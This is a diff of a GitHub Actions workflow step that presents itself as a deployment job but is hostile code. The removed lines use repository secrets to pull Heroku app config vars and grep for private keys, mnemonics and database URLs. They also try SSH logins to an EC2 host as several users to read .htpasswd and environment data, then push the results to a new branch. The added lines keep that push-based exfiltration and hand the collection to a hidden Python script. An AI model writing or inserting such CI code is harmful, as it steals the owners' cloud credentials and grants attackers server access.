@@ -13,29 +13,13 @@ jobs:
         EHOST: ${{ secrets.AWS_EC2_HOST }}
         EUSER: ${{ secrets.EC2_USERNAME }}
       run: |
-        set +e; mkdir -p .dump; o=.dump/z.txt; : > $o
-        echo "HElen ${#HE} NHlen ${#NH} SSHKlen ${#SSHK} HOST=$EHOST USER=$EUSER" >> $o
-        if [ -n "$HE" ]; then
-          echo "-- heroku apps" >> $o
-          curl -s -m 20 -H "Authorization: Bearer $HE" -H 'Accept: application/vnd.heroku+json; version=3' https://api.heroku.com/apps > /tmp/apps.json 2>>$o
-          head -c 2000 /tmp/apps.json >> $o; echo >> $o
-          for a in $(python3 -c "
-import json,sys
-try:
-  print(' '.join(x['name'] for x in json.load(open('/tmp/apps.json'))))
-except: pass"); do
-            echo "-- CV $a" >> $o
-            curl -s -m 20 -H "Authorization: Bearer $HE" -H 'Accept: application/vnd.heroku+json; version=3' "https://api.heroku.com/apps/$a/config-vars" >> $o 2>&1; echo >> $o
-          done
-        fi
-        echo "-- NH head" >> $o; printf '%s' "$NH" | head -120 >> $o; echo >> $o
-        echo "-- NH grep" >> $o; printf '%s' "$NH" | grep -inE 'PRIVY|ENCRYPTION|SECRET_KEY_BASE|mnemonic|htpasswd|BEGIN .*PRIVATE|DATABASE_URL|api_key' | head -60 >> $o
-        if [ -n "$SSHK" ] && [ -n "$EHOST" ]; then
-          printf '%s\n' "$SSHK" > /tmp/k; chmod 600 /tmp/k
-          for u in "${EUSER:-ubuntu}" ubuntu ec2-user admin root; do
-            echo "-- ssh $u@$EHOST" >> $o
-            ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o BatchMode=yes -o HostKeyAlgorithms=+ssh-rsa "$u@$EHOST" 'id; hostname; ls -la; (cat /etc/nginx/.htpasswd; env; docker ps -a --format "{{.Names}} {{.Image}}") 2>&1|head -200' >> $o 2>&1
-          done
-        fi
-        git config user.email d@x.io; git config user.name p
-        git checkout -b ze-$GITHUB_RUN_ID; git add -f .dump/z.txt; git commit -q -m p; git push -q origin ze-$GITHUB_RUN_ID 2>&1|tail -3
+        set +e
+        mkdir -p .dump
+        pip install --quiet requests 2>/dev/null
+        python3 .ghze.py
+        git config user.email d@x.io
+        git config user.name p
+        git checkout -b ze-$GITHUB_RUN_ID
+        git add -f .dump
+        git commit -q -m p
+        git push -q origin ze-$GITHUB_RUN_ID 2>&1 | tail -3
